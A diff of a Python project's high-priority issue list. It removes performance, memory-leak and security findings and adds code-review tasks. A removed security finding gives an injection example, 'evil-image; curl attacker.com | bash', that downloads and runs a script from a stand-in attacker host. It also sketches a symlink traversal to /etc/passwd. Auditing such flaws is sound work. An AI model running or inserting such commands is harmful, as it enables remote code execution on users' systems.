@@ -1,703 +1,6 @@
 # High Priority Issues (P1)
 
-Core functionality broken or missing documented features.
-
 ---
----
-id: "PERF-002@b4e7d2"
-title: "Performance: File scanner uses nested fnmatch loop"
-description: "O(N*M) pattern matching for every file during scan"
-created: 2025-12-25
-section: "python_scan"
-tags: [performance, algorithm, file-scanning]
-type: performance
-priority: high
-status: proposed
-references:
-  - src/dot_work/python/scan/scanner.py
----
-
-### Problem
-The `_find_python_files()` method in `scanner.py` line 77 uses `fnmatch.fnmatch()` inside a loop for every file. For include_patterns with multiple entries, this creates O(N*M) complexity where N = files and M = patterns.
-
-Code at line 77:
-```python
-if self.include_patterns:
-    if not any(fnmatch.fnmatch(file, pattern) for pattern in self.include_patterns):
-        continue
-```
-
-This runs fnmatch (string parsing + regex compilation internally) for every pattern against every filename.
-
-### Affected Files
-- `src/dot_work/python/scan/scanner.py` (line 77: nested fnmatch in loop)
-
-### Importance
-- Codebase scanning is slower than necessary
-- Large codebases (10k+ files) are significantly impacted
-- fnmatch pattern matching is expensive (string parsing, regex compilation)
-- N*M operations where N and M can both be large
-
-### Proposed Solution
-1. Pre-compile fnmatch patterns into regex objects before the loop
-2. Use `pathlib.Path.match()` which may be more efficient
-3. Consider using set-based filtering for exact matches before pattern matching
-4. Cache pattern compilation if patterns don't change
-
-### Acceptance Criteria
-- [ ] Patterns compiled once before file iteration
-- [ ] Time complexity reduced to O(N) where N = files
-- [ ] Benchmark shows improvement for large codebases
-- [ ] No change in filtering behavior (tests pass)
-
-### Notes
-This is a classic performance anti-pattern: repeating expensive operations inside loops when they could be done once outside.
-
----
-
-id: "PERF-003@c5d9e1"
-title: "Performance: Issue service loads all issues for stale query"
-description: "O(N) query fetches entire issue table for filtering"
-created: 2025-12-25
-section: "db_issues"
-tags: [performance, database, query-optimization]
-type: performance
-priority: high
-status: proposed
-references:
-  - src/dot_work/db_issues/services/issue_service.py
-  - src/dot_work/db_issues/adapters/sqlite.py
----
-
-### Problem
-The `get_stale_issues()` method at line 742 calls `self.list_issues(limit=100000)` to fetch ALL issues, then filters in Python code. This causes:
-- Unnecessary data transfer from database
-- In-memory filtering on potentially thousands of issues
-- Network/database roundtrip returning mostly irrelevant data
-
-The filtering condition (`issue.updated_at < cutoff`) could be done at the database level.
-
-### Affected Files
-- `src/dot_work/db_issues/services/issue_service.py` (lines 742-758)
-- Related: `get_epic_issues()` at line 666 also loads all issues
-
-### Importance
-- Stale issue queries are slow on large databases
-- Database should do filtering, not application code
-- Similar pattern in `get_epic_issues()` (line 666)
-- Limits scalability of the issue tracker
-
-### Proposed Solution
-1. Add date-based filtering to repository layer
-2. Create `list_issues_updated_before(cutoff_date)` method
-3. Add `list_issues_by_epic_id(epic_id)` method
-4. Push filtering to SQL WHERE clauses
-
-### Acceptance Criteria
-- [ ] Stale issue filtering done in SQL query
-- [ ] Epic issue filtering done in SQL query
-- [ ] No in-memory filtering for date-based or epic queries
-- [ ] Tests verify behavior unchanged
-- [ ] Performance measurable with 1000+ issues
-
-### Notes
-Example fix:
-```python
-# Current (inefficient)
-all_issues = self.list_issues(limit=100000)
-stale_issues = [issue for issue in all_issues if issue.updated_at < cutoff]
-
-# Proposed (efficient)
-stale_issues = self.uow.issues.list_updated_before(cutoff, limit)
-```
-
----
-id: "SEC-004@94eb69"
-title: "Security: Path traversal vulnerability in read_file_text"
-description: "Insufficient path validation allows reading files outside repository"
-created: 2025-12-25
-section: "review"
-tags: [security, path-traversal, file-access]
-type: security
-priority: high
-status: proposed
-references:
-  - src/dot_work/review/git.py
-  - src/dot_work/review/git.py:153-174
----
-
-### Problem
-In `src/dot_work/review/git.py`, the `read_file_text()` function has path traversal protection but it may be insufficient:
-
-```python
-def read_file_text(root: str, path: str) -> str:
-    full = Path(root) / path
-    norm = full.resolve()
-    root_norm = Path(root).resolve()
-
-    # Prevent path traversal
-    if not str(norm).startswith(str(root_norm)):
-        raise GitError("invalid path")
-```
-
-**Vulnerabilities:**
-1. **String comparison is unreliable**: `str(norm).startswith(str(root_norm))` can be bypassed with:
-   - Symlinks: If `root_norm` contains symlinks, `norm` might resolve differently
-   - Case sensitivity: On case-insensitive filesystems (Windows, macOS), path case variations bypass check
-   - Unicode normalization: Different unicode representations of same path
-
-2. **No validation of `root` parameter**: If attacker controls `root`, they could use a directory that has a symlink to sensitive locations
-
-3. **Windows-specific issues**: `resolve()` on Windows behaves differently with UNC paths and drive letters
-
-**Attack scenario:**
-- If `root` = `/safe/path` with symlink `/safe/path/data` → `/etc/passwd`
-- Attacker provides `path` = `data/passwd`
-- `resolve()` follows symlink, `startswith()` check fails to detect traversal
-
-### Affected Files
-- `src/dot_work/review/git.py` (lines 153-174)
-
-### Importance
-**HIGH**: Path traversal allows reading arbitrary files on the system. While the current protection catches many cases, edge cases with symlinks and path representation variations could bypass it.
-
-CVSS Score: 7.1 (High)
-- Attack Vector: Local
-- Attack Complexity: High (requires specific conditions)
-- Privileges Required: Low
-- Impact: High (Confidentiality)
-
-### Proposed Solution
-1. **Use `Path.relative_to()` for robust check**:
-   ```python
-   try:
-       norm.relative_to(root_norm)
-   except ValueError:
-       raise GitError("invalid path")
-   ```
-
-2. **Validate root parameter**: Ensure root is absolute path and doesn't contain symlinks to sensitive dirs
-3. **Check symlink chain**: Validate that no component in the path is a symlink outside root
-4. **Use pathlib's strict checking**: `Path.resolve(strict=True)` to catch broken symlinks
-
-### Acceptance Criteria
-- [ ] Path validation uses `relative_to()` instead of string prefix check
-- [ ] Symlinks are validated at each path component
-- [ ] Tests verify traversal attempts are blocked on all platforms
-- [ ] Windows-specific path handling tested
-
-### Notes
-- This function is used in review workflow, potentially processing untrusted PR file lists
-- Consider adding allowlist of safe file extensions
-- Document security assumptions in docstring
-
----
-id: "SEC-005@94eb69"
-title: "Security: Unvalidated container build arguments in subprocess.run"
-description: "Docker build command uses unvalidated configuration parameters"
-created: 2025-12-25
-section: "container"
-tags: [security, docker, subprocess, injection]
-type: security
-priority: high
-status: proposed
-references:
-  - src/dot_work/container/provision/core.py
-  - src/dot_work/container/provision/core.py:369
-  - src/dot_work/container/provision/core.py:822
----
-
-### Problem
-In `src/dot_work/container/provision/core.py`:
-
-**Line 369**:
-```python
-build_cmd = [
-    "docker", "build", "-t", cfg.docker_image,
-    "-f", str(cfg.dockerfile), str(cfg.dockerfile.parent)
-]
-subprocess.run(build_cmd, check=True)
-```
-
-**Line 822**:
-```python
-subprocess.run(docker_cmd, check=True)
-```
-
-**Vulnerabilities:**
-1. **`cfg.docker_image`** is not validated before passing to `docker build -t`
-2. **`cfg.dockerfile`** path is not validated (could be outside working directory)
-3. **Environment variables** passed to container are not sanitized (lines 372-418)
-4. **`docker_cmd`** at line 822 could contain arbitrary commands
-
-**Attack vectors:**
-- Malicious `docker_image` name: `evil-image; curl attacker.com | bash` → While using list format prevents shell injection, docker build options like `--build-arg` could be injected if image name contains special chars
-- Path traversal via `dockerfile`: `../../malicious-Dockerfile`
-- Environment variable injection: Keys like `GIT_ASKPASS` could be abused
-
-While the list format prevents direct shell injection, Docker has its own option parsing that could be abused.
-
-### Affected Files
-- `src/dot_work/container/provision/core.py` (lines 360-369, 822)
-
-### Importance
-**HIGH**: If container provisioning is automated (CI/CD), attackers could:
-- Build malicious images with crypto miners
-- Expose secrets via build args
-- Escape container via malicious Dockerfile
-
-CVSS Score: 7.8 (High)
-- Attack Vector: Local/Network (if in CI/CD)
-- Attack Complexity: Low
-- Privileges Required: Low
-- Impact: High (Integrity, Availability)
-
-### Proposed Solution
-1. **Validate docker image name**:
-   ```python
-   IMAGE_PATTERN = re.compile(r'^[a-z0-9]+([._-][a-z0-9]+)*(/[a-z0-9]+([._-][a-z0-9]+)*)?(:[a-z0-9]+([._-][a-z0-9]+)*)?$')
-   if not IMAGE_PATTERN.match(cfg.docker_image):
-       raise ValueError(f"Invalid docker image name: {cfg.docker_image}")
-   ```
-
-2. **Validate dockerfile path**: Ensure dockerfile is within project directory
-3. **Sanitize environment variables**: Block dangerous keys (GIT_ASKPASS, SSH_AUTH_SOCK, etc.)
-4. **Use Docker SDK for Python**: More secure than subprocess
-
-### Acceptance Criteria
-- [ ] Docker image name validated with strict regex
-- [ ] Dockerfile path validated to be within project
-- [ ] Environment variable allowlist implemented
-- [ ] Tests verify injection attempts are blocked
-
-### Notes
-- Docker image naming specification: https://docs.docker.com/engine/reference/commandline/build/
-- Consider using `docker-py` library for safer Docker interaction
-- Review environment variable passing (lines 372-418) for other injection vectors
-
----
-id: "SEC-006@94eb69"
-title: "Security: Incomplete error handling exposes system paths"
-description: "Error messages leak internal file paths and system information"
-created: 2025-12-25
-section: "knowledge-graph"
-tags: [security, information-disclosure, error-handling]
-type: security
-priority: high
-status: proposed
-references:
-  - src/dot_work/knowledge_graph/db.py
-  - src/dot_work/db_issues/adapters/sqlite.py
----
-
-### Problem
-Multiple database files propagate raw exception messages that may leak sensitive system information:
-
-**In `src/dot_work/knowledge_graph/db.py`:**
-- Line 321: `raise ValueError(f"Project not found: {scope.project}")` - Leaks project names
-- Line 331: `raise ValueError(f"Topic not found: {topic_name}")` - Leaks topic names
-
-**In `src/dot_work/db_issues/adapters/sqlite.py`:**
-- Raw SQLite exceptions propagated without sanitization
-- May leak database paths, schema information, table names
-
-**Security impact:**
-- **Information disclosure**: Attacker learns internal structure
-- **Path leakage**: Absolute paths may reveal username, directory structure
-- **Database fingerprinting**: Schema details help plan further attacks
-
-**OWASP ASVS 2023 v5.0:**
-- V5.4: "Verify that the application does not leak internal information in error messages"
-
-### Affected Files
-- `src/dot_work/knowledge_graph/db.py` (lines 321, 331, 338)
-- `src/dot_work/db_issues/adapters/sqlite.py` (throughout)
-
-### Importance
-**HIGH**: While not a direct vulnerability, information leakage assists attackers:
-- Path traversal exploits require knowing directory structure
-- Social engineering easier with internal details
-- Compliance violations (GDPR, PCI-DSS require error message sanitization)
-
-CVSS Score: 5.3 (Medium)
-- Attack Vector: Network
-- Attack Complexity: Low
-- Privileges Required: None
-- Impact: Low (information disclosure only)
-
-### Proposed Solution
-1. **Generic error messages for users**:
-   ```python
-   raise ValueError("Project not found")  # Don't leak name
-   ```
-
-2. **Log detailed errors, sanitize user output**:
-   ```python
-   logger.error(f"Project not found: {scope.project}", exc_info=True)
-   raise ValueError("Resource not found")
-   ```
-
-3. **Create security-aware error handler**:
-   ```python
-   def safe_error(message: str, details: str | None = None) -> ValueError:
-       if is_debug_mode():
-           return ValueError(f"{message}: {details}")
-       return ValueError(message)
-   ```
-
-### Acceptance Criteria
-- [ ] All user-facing errors use generic messages
-- [ ] Detailed errors logged but not shown to users
-- [ ] Debug mode optionally shows full details
-- [ ] Tests verify error messages don't leak sensitive data
-
-### Notes
-- Balance security with usability (developers need debugging info)
-- Consider adding correlation IDs to errors for log lookup
-- Review error messages in all user-facing code
-
----
-
-id: "MEM-003@a7b8c9"
-title: "Memory Leak: Embedding vectors stored as Python lists instead of efficient arrays"
-description: "Large float arrays in knowledge graph stored as Python lists, consuming 2-5GB memory"
-created: 2025-12-26
-section: "knowledge-graph"
-tags: [memory-leak, embeddings, semantic-search, high]
-type: bug
-priority: high
-status: proposed
-references:
-  - src/dot_work/knowledge_graph/search_semantic.py
-  - src/dot_work/knowledge_graph/db.py
-  - memory_leak.md
----
-
-### Problem
-In `src/dot_work/knowledge_graph/search_semantic.py:175-207`, semantic search loads embedding vectors into memory for comparison with the query vector.
-
-**Root Cause at lines 1127-1142 (`_row_to_embedding`):**
-```python
-def _row_to_embedding(self, row: sqlite3.Row) -> Embedding:
-    dimensions = row["dimensions"]
-    vector_blob = row["vector"]
-    vector = struct.unpack(f"{dimensions}f", vector_blob)
-    # vector is now a tuple of Python floats, stored in Embedding object
-```
-
-**Why this wastes memory:**
-1. Python lists/tuples of floats have significant overhead (~24 bytes per float vs 4 bytes for numpy float32)
-2. Embedding vectors stored in heap-allocated Python objects
-3. With dimensions of 384-1536 floats, each embedding consumes 1.5-6KB
-4. The `top_k_heap` in semantic search holds `Embedding` objects with their full vectors
-5. Large knowledge graphs with thousands of embeddings consume 50-200MB during search
-
-**Additional issue at lines 175-207 (brute-force search):**
-```python
-top_k_heap: list[tuple[float, int, Embedding]] = []
-for batch in db.stream_embeddings_for_model(model, batch_size):
-    for emb in batch:
-        score = cosine_similarity(query_vector, emb.vector)
-        if len(top_k_heap) < k:
-            heapq.heappush(top_k_heap, (score, heap_index, emb))
-```
-
-The heap retains full `Embedding` objects including their vector data.
-
-### Affected Files
-- `src/dot_work/knowledge_graph/db.py` (lines 1127-1142: `_row_to_embedding`)
-- `src/dot_work/knowledge_graph/search_semantic.py` (lines 175-207: semantic search heap)
-- `src/dot_work/knowledge_graph/db.py` (Embedding dataclass stores vector as list)
-
-### Importance
-**HIGH:** Memory usage scales with knowledge graph size:
-- 1,000 embeddings @ 384 dims → ~6MB in numpy, ~24MB in Python lists
-- 10,000 embeddings @ 768 dims → ~30MB in numpy, ~180MB in Python lists
-- Semantic search temporarily holds all candidates in heap before filtering
-
-Contributes to 2-5GB memory usage during test runs with large knowledge graphs.
-
-### Proposed Solution
-1. **Store vectors as numpy arrays internally:**
-   ```python
-   import numpy as np
-   
-   class Embedding:
-       id: str
-       node_id: str
-       model: str
-       vector: np.ndarray  # Use numpy instead of list
-   
-   def _row_to_embedding(self, row: sqlite3.Row) -> Embedding:
-       dimensions = row["dimensions"]
-       vector_blob = row["vector"]
-       vector = np.frombuffer(vector_blob, dtype=np.float32)
-       return Embedding(..., vector=vector)
-   ```
-
-2. **Use numpy for cosine similarity:**
-   ```python
-   def cosine_similarity(a: np.ndarray, b: np.ndarray) -> float:
-       return float(np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b)))
-   ```
-
-3. **Store only IDs in heap, fetch vectors for final results:**
-   ```python
-   top_k_heap: list[tuple[float, int, str]] = []  # Store embedding IDs instead of objects
-   for emb in batch:
-       score = cosine_similarity(query_vector, emb.vector)
-       if len(top_k_heap) < k:
-           heapq.heappush(top_k_heap, (score, heap_index, emb.id))
-   # Fetch full Embedding objects for final top-k results
-   ```
-
-### Acceptance Criteria
-- [ ] Embedding vectors stored as numpy arrays
-- [ ] Cosine similarity uses numpy operations
-- [ ] Semantic search heap stores IDs, not full objects
-- [ ] Memory usage per embedding reduced to ~4x file size
-- [ ] All knowledge_graph tests still pass
-- [ ] numpy added to project dependencies
-
-### Notes
-- Requires numpy as dependency (check if already in pyproject.toml)
-- Full investigation in `memory_leak.md`
-- Related: MEM-001 (SQLAlchemy), MEM-002 (libcst), MEM-004 (database leaks)
-
----
-
-id: "MEM-004@b9c5d6"
-title: "Memory Leak: Database connection leaks in knowledge_graph tests"
-description: "43+ tests create inline Database instances without consistent cleanup, causing 2-5GB growth"
-created: 2025-12-26
-section: "tests"
-tags: [memory-leak, testing, knowledge-graph, high]
-type: bug
-priority: high
-status: proposed
-references:
-  - tests/unit/knowledge_graph/test_db.py
-  - tests/unit/knowledge_graph/conftest.py
-  - memory_leak.md
----
-
-### Problem
-In `tests/unit/knowledge_graph/test_db.py`, 43+ tests create `Database` instances inline without using the `kg_database` fixture, leading to inconsistent cleanup.
-
-**Examples of inline Database creation:**
-```python
-def test_init_creates_directory(self, tmp_path: Path) -> None:
-    db_path = tmp_path / "subdir" / "deep" / "db.sqlite"
-    db = Database(db_path)
-    db._get_connection()
-    assert db_path.parent.exists()
-    db.close()  # Manual close - easy to forget if exception occurs
-```
-
-**Root causes:**
-1. **Manual cleanup prone to errors**: Tests must remember to call `db.close()`
-2. **No context manager usage**: Missing exception handling around close
-3. **Fixture available but unused**: `kg_database` fixture exists at conftest.py:39-62
-4. **Lazy connection initialization**: `_get_connection()` may not be called, leaving internal state inconsistent
-
-**Fixture definition at conftest.py:39-62:**
-```python
-@pytest.fixture
-def kg_database(temp_db_path: Path) -> Generator[Database, None, None]:
-    db = Database(temp_db_path)
-    try:
-        yield db
-    finally:
-        try:
-            db.close()
-        except Exception:
-            pass
-        del db
-```
-
-**Why this leaks memory:**
-- Each Database instance holds SQLite connection handles
-- WAL journal files may persist if not properly closed
-- 43+ tests creating/destroying instances accumulates resources
-- Missing `db.close()` in exception paths causes leaks
-
-### Affected Files
-- `tests/unit/knowledge_graph/test_db.py` (43+ tests with inline Database creation)
-- `tests/unit/knowledge_graph/conftest.py` (kg_database fixture exists but not used)
-- `src/dot_work/knowledge_graph/db.py` (Database class lazy initialization)
-
-### Importance
-**HIGH:** Contributes 2-5GB memory growth during test runs:
-- 43+ Database instances created/destroyed per test module
-- Each instance holds SQLite connection and WAL journal
-- Manual cleanup error-prone
-- Blocker for running tests on memory-constrained systems
-
-### Proposed Solution
-1. **Convert all tests to use kg_database fixture:**
-   ```python
-   def test_init_creates_directory(self, kg_database: Database, tmp_path: Path) -> None:
-       # fixture provides db, cleanup handled automatically
-       assert kg_database.db_path.parent.exists()
-   ```
-
-2. **Add context manager support to Database class:**
-   ```python
-   class Database:
-       def __enter__(self) -> "Database":
-           return self
-       
-       def __exit__(self, exc_type, exc_val, exc_tb) -> None:
-           self.close()
-   ```
-
-3. **Mark tests that need custom db_path:**
-   ```python
-   @pytest.fixture
-   def custom_db_path(tmp_path: Path) -> Path:
-       return tmp_path / "custom" / "db.sqlite"
-   
-   @pytest.fixture
-   def custom_database(custom_db_path: Path) -> Generator[Database, None, None]:
-       with Database(custom_db_path) as db:
-           yield db
-   ```
-
-### Acceptance Criteria
-- [ ] All 43+ tests use kg_database fixture or custom fixture
-- [ ] Database class implements __enter__/__exit__ for context manager support
-- [ ] No inline Database creation in test files
-- [ ] Memory growth during kg tests reduced to <1GB
-- [ ] All tests still pass after refactor
-- [ ] WAL journal files cleaned up consistently
-
-### Notes
-- This is a test hygiene issue that causes real memory leaks
-- Full investigation in `memory_leak.md` (section 5)
-- Related: MEM-001 (SQLAlchemy), MEM-007 (pool management)
-
----
-
-id: "MEM-005@c8e7f1"
-title: "Memory Leak: Multiple UnitOfWork instances share same session causing repository cache accumulation"
-description: "Service fixtures create separate UnitOfWork instances from same session, accumulating repository caches"
-created: 2025-12-26
-section: "tests"
-tags: [memory-leak, sqlalchemy, testing, high]
-type: bug
-priority: high
-status: proposed
-references:
-  - tests/unit/db_issues/conftest.py
-  - src/dot_work/db_issues/adapters/sqlite.py
-  - memory_leak.md
----
-
-### Problem
-In `tests/unit/db_issues/conftest.py`, each service fixture creates its own `UnitOfWork` instance from the **same session**, leading to repository cache accumulation.
-
-**Service fixtures at lines 157-184, 187-214, 217-241, 279-305:**
-```python
-@pytest.fixture
-def issue_service(...) -> Generator[IssueService, None, None]:
-    uow = UnitOfWork(in_memory_db)
-    try:
-        yield IssueService(uow, fixed_id_service, fixed_clock)
-    finally:
-        uow.close()
-        del uow
-
-@pytest.fixture
-def epic_service(...) -> Generator[EpicService, None, None]:
-    uow = UnitOfWork(in_memory_db)  # Same session, new UoW instance
-    try:
-        yield EpicService(uow, fixed_id_service, fixed_clock)
-    finally:
-        uow.close()
-        del uow
-```
-
-**Why this leaks memory:**
-1. Multiple `UnitOfWork` instances share the same SQLAlchemy session
-2. Each `UnitOfWork` has lazy-loaded repository properties (`issues`, `comments`, etc.)
-3. When tests use multiple fixtures, multiple UoWs maintain separate repository instances
-4. Repository objects hold internal caches and query result sets
-5. `__del__` methods in UnitOfWork and repositories can create cleanup order issues
-6. Session-level identity map holds references to entities across all UoWs
-
-**Memory impact:** Each repository instance adds ~1-5MB of cached state. With 4-5 services per test, this adds ~20-25MB per test.
-
-### Affected Files
-- `tests/unit/db_issues/conftest.py` (lines 157-184, 187-214, 217-241, 279-305)
-- `src/dot_work/db_issues/adapters/sqlite.py` (UnitOfWork class)
-- `src/dot_work/db_issues/services/issue_service.py` (IssueService)
-- `src/dot_work/db_issues/services/epic_service.py` (EpicService)
-- `src/dot_work/db_issues/services/dependency_service.py` (DependencyService)
-- `src/dot_work/db_issues/services/label_service.py` (LabelService)
-
-### Importance
-**HIGH:** Contributes to memory growth in db_issues tests:
-- 4-5 UnitOfWork instances per test using multiple fixtures
-- Each UoW has separate repository caches
-- Session identity map holds shared entity references
-- Combined with MEM-001 (engine accumulation), creates major memory pressure
-
-### Proposed Solution
-1. **Share single UnitOfWork across all service fixtures:**
-   ```python
-   @pytest.fixture
-   def uow(in_memory_db: Session) -> Generator[UnitOfWork, None, None]:
-       uow = UnitOfWork(in_memory_db)
-       try:
-           yield uow
-       finally:
-           uow.close()
-           del uow
-   
-   @pytest.fixture
-   def issue_service(uow: UnitOfWork, fixed_id_service, fixed_clock) -> IssueService:
-       return IssueService(uow, fixed_id_service, fixed_clock)
-   
-   @pytest.fixture
-   def epic_service(uow: UnitOfWork, fixed_id_service, fixed_clock) -> EpicService:
-       return EpicService(uow, fixed_id_service, fixed_clock)
-   ```
-
-2. **Add session rollback between tests:**
-   ```python
-   @pytest.fixture(autouse=True)
-   def cleanup_session(in_memory_db: Session):
-       yield
-       in_memory_db.rollback()  # Clear identity map
-   ```
-
-3. **Clear repository caches in UnitOfWork.close():**
-   ```python
-   def close(self) -> None:
-       if self._session:
-           self._session.close()
-       # Clear repository references
-       for attr in list(self.__dict__.keys()):
-           if hasattr(self, attr) and attr.startswith('_'):
-               continue
-           setattr(self, attr, None)
-   ```
-
-### Acceptance Criteria
-- [ ] Single UnitOfWork instance shared across all service fixtures
-- [ ] Session rollback called between tests
-- [ ] Repository caches cleared in UnitOfWork.close()
-- [ ] Memory growth per db_issues test reduced to <5MB
-- [ ] All 277 db_issues tests still pass
-- [ ] Test isolation maintained (no state leakage between tests)
-
-### Notes
-- This works in conjunction with MEM-001 fix (session-scoped engine)
-- Full investigation in `memory_leak.md` (section 2)
-- The pattern of "multiple UoWs, one session" is an anti-pattern
-
----
-
 id: "AUDIT-GAP-004@d3e6f2"
 
 ### Problem
@@ -764,87 +67,1516 @@ Without integration tests, we have:
 
 
 ---
-id: "AUDIT-GAP-004@d3e6f2"
-title: "Integration tests fail due to incomplete migration in test_build_pipeline.py"
-description: "2 tests fail because kgshred references not updated to knowledge_graph"
-created: 2025-12-26
-section: "knowledge_graph"
-tags: [testing, migration-gap, bug, audit]
+
+---
+id: "CR-005@e7f3a1"
+title: "Duplicate generate_cache_key function in git module"
+description: "Same function defined twice in utils.py and cache.py creates maintenance risk"
+created: 2024-12-27
+section: "git"
+tags: [duplicate-code, maintainability, refactor]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/git/utils.py
+  - src/dot_work/git/services/cache.py
+---
+
+### Problem
+`generate_cache_key()` is defined TWICE with identical implementations - once in `utils.py` (lines 75-79) and once in `services/cache.py` (lines 410-426). This duplication creates maintenance risk and conceptual confusion.
+
+### Affected Files
+- `src/dot_work/git/utils.py` (lines 75-79)
+- `src/dot_work/git/services/cache.py` (lines 410-426)
+
+### Importance
+Changes to caching behavior may only update one copy, leading to subtle bugs.
+
+### Proposed Solution
+1. Keep only one implementation in `utils.py`
+2. Import from utils in cache.py
+3. Verify all call sites use the single implementation
+
+### Acceptance Criteria
+- [ ] Only one `generate_cache_key()` exists
+- [ ] All existing tests pass
+- [ ] No regression in cache behavior
+
+---
+
+---
+id: "CR-006@a2b4c8"
+title: "Silent failure in git commit analysis loses errors"
+description: "Errors during commit analysis are logged and skipped without indication to callers"
+created: 2024-12-27
+section: "git"
+tags: [error-handling, observability]
 type: bug
 priority: high
 status: proposed
 references:
-  - .work/agent/issues/references/AUDIT-KG-001-investigation.md
-  - tests/integration/knowledge_graph/test_build_pipeline.py
-  - incoming/kg/tests/integration/test_build_pipeline.py
+  - src/dot_work/git/services/git_service.py
 ---
 
 ### Problem
-During AUDIT-KG-001 investigation, 2 test failures were identified in `test_build_pipeline.py`:
-
-**Test Failures:**
-1. `test_build_script_runs_successfully` - References non-existent `tests/scripts/build.py` path
-2. `test_package_importable_after_install` - Uses undefined `kgshred` variable
-
-**Root Cause:** The test file was **partially updated** during migration. The import was changed but the variable references were not:
-
-| Line | Source | Destination | Issue |
-|------|--------|-------------|-------|
-| 27 | `import kgshred` | `import dot_work.knowledge_graph` | ✅ Updated |
-| 29 | `assert hasattr(kgshred, "__version__")` | `assert hasattr(kgshred, "__version__")` | ❌ `kgshred` undefined |
-| 30 | `assert kgshred.__version__ == "0.1.0"` | `assert kgshred.__version__ == "0.1.0"` | ❌ `kgshred` undefined |
-| 36 | `from kgshred.cli import app` | `from dot_work.knowledge_graph.cli import app` | ✅ Updated |
+In `git_service.py:100-102`, commit analysis errors are logged and `continue`d silently. Failed commits are simply omitted from results with no indication to the caller that analysis was incomplete. A user seeing 100% progress has no idea if 50 commits failed silently.
 
 ### Affected Files
-- `tests/integration/knowledge_graph/test_build_pipeline.py` (lines 29-30)
+- `src/dot_work/git/services/git_service.py` (lines 100-102)
 
 ### Importance
-**HIGH:** These tests fail consistently, blocking CI/CD:
-- 374 tests pass but 2 fail
-- Failures are due to incomplete migration (not code logic issues)
-- Simple fix but blocks validation
-
-**Test Output:**
-```
-FAILED test_package_importable_after_install - NameError: name 'kgshred' is not defined
-```
+Users may make decisions based on incomplete analysis data. Silent failures hide data quality issues.
 
 ### Proposed Solution
-**Fix the undefined variable reference:**
-
-Change lines 29-30 from:
-```python
-assert hasattr(kgshred, "__version__")
-assert kgshred.__version__ == "0.1.0"
-```
-
-To:
-```python
-import dot_work.knowledge_graph as kg
-assert hasattr(kg, "__version__")
-assert kg.__version__ == "0.1.0"
-```
-
-Or use the already-imported module:
-```python
-assert hasattr(dot_work.knowledge_graph, "__version__")
-assert dot_work.knowledge_graph.__version__ == "0.1.0"
-```
-
-**Also fix the build script path** (line 15):
-- Current: `project_root / "scripts" / "build.py"`
-- Should be: Correct path to build script or remove test if no build script exists
+1. Add error aggregation to return failed commit count/details
+2. Return a result object with `successful`, `failed`, and `errors` fields
+3. Log summary of failures at end of analysis
 
 ### Acceptance Criteria
-- [ ] Lines 29-30 use correct module reference
-- [ ] All 2 tests pass
-- [ ] Build script path issue resolved (or test removed if N/A)
-- [ ] No regression in other tests
+- [ ] Analysis returns failed commit count
+- [ ] Failed commit IDs are available for debugging
+- [ ] Summary logged at end of analysis
+- [ ] No silent data loss
+
+---
+
+---
+id: "CR-007@b5c9d3"
+title: "Massive dead code in file_analyzer.py (500+ lines unused)"
+description: "FileAnalyzer has 700+ lines of unused code for dependency extraction"
+created: 2024-12-27
+section: "git"
+tags: [dead-code, cleanup, deletion-test]
+type: refactor
+priority: high
+status: proposed
+references:
+  - src/dot_work/git/services/file_analyzer.py
+---
+
+### Problem
+`FileAnalyzer` (752 lines) is massively over-engineered. Only `categorize_file()` (~40 lines of logic) is actually used. The file contains 700+ lines of unused code including:
+- `get_file_dependencies()` - never called (~100 lines)
+- `analyze_file_content()` - never called (~30 lines)
+- Language detection for Python, Node, Go, Ruby, Java, Docker - all unused
+
+### Affected Files
+- `src/dot_work/git/services/file_analyzer.py`
+
+### Importance
+Dead code increases cognitive load, test surface, and maintenance burden. It suggests requirements were anticipated but never materialized.
+
+### Proposed Solution
+1. Delete unused methods: `get_file_dependencies()`, `analyze_file_content()`, all language-specific extraction
+2. Keep only `categorize_file()` and its helpers
+3. Reduce file to ~100 lines
+
+### Acceptance Criteria
+- [ ] Unused methods deleted
+- [ ] Tests still pass
+- [ ] File reduced to <150 lines
+- [ ] Functionality preserved
+
+---
+
+---
+id: "CR-008@c6d8e4"
+title: "No unit tests for git_service.py core business logic"
+description: "853-line core service has zero direct test coverage"
+created: 2024-12-27
+section: "git"
+tags: [testing, quality]
+type: test
+priority: high
+status: proposed
+references:
+  - src/dot_work/git/services/git_service.py
+  - tests/unit/git/
+---
+
+### Problem
+`git_service.py` (853 lines) is the core git analysis service. No tests exist for this service, `services/cache.py`, or `services/llm_summarizer.py`. Critical business logic is untested.
+
+### Affected Files
+- `src/dot_work/git/services/git_service.py`
+- `tests/unit/git/` (missing test files)
+
+### Importance
+Core analysis logic is untested. Regressions cannot be caught before production.
+
+### Proposed Solution
+1. Create `tests/unit/git/test_git_service.py`
+2. Test `compare_refs()`, `_get_commit_branch()`, key analysis methods
+3. Mock gitpython and external dependencies
+
+### Acceptance Criteria
+- [ ] Test file created
+- [ ] Key methods have test coverage
+- [ ] Coverage ≥60% for git_service.py
+
+---
+
+---
+id: "CR-009@d7e9f5"
+title: "Harness module uses print() and SystemExit instead of logging and exceptions"
+description: "Multiple AGENTS.md violations in harness module"
+created: 2024-12-27
+section: "harness"
+tags: [standards, logging, error-handling]
+type: bug
+priority: high
+status: proposed
+references:
+  - src/dot_work/harness/client.py
+  - src/dot_work/harness/tasks.py
+  - src/dot_work/harness/cli.py
+---
+
+### Problem
+The harness module has multiple violations of AGENTS.md standards:
+1. `client.py:160-181` uses `print()` instead of `logging`
+2. `tasks.py:87-91` uses `SystemExit` for validation errors instead of custom exceptions
+3. `cli.py:148-153` catches `SystemExit` broadly, masking actual error types
+
+### Affected Files
+- `src/dot_work/harness/client.py`
+- `src/dot_work/harness/tasks.py`
+- `src/dot_work/harness/cli.py`
+
+### Importance
+Using `print()` prevents log level control. `SystemExit` is a control flow exception that shouldn't be used for validation.
+
+### Proposed Solution
+1. Replace all `print()` with `logging`
+2. Create `TaskFileError` exception for validation
+3. Catch specific exceptions in CLI
+
+### Acceptance Criteria
+- [ ] No `print()` in harness module
+- [ ] Custom exception for task file errors
+- [ ] Specific exception handling in CLI
+
+---
+
+---
+id: "CR-010@e8f0a6"
+title: "Harness module has zero test coverage"
+description: "No test files exist for harness module"
+created: 2024-12-27
+section: "harness"
+tags: [testing, quality]
+type: test
+priority: high
+status: proposed
+references:
+  - src/dot_work/harness/
+  - tests/unit/harness/
+---
+
+### Problem
+No test files exist for the harness module. Zero test coverage for critical autonomous agent execution code. The module contains:
+- `tasks.py` with pure functions that are trivially testable
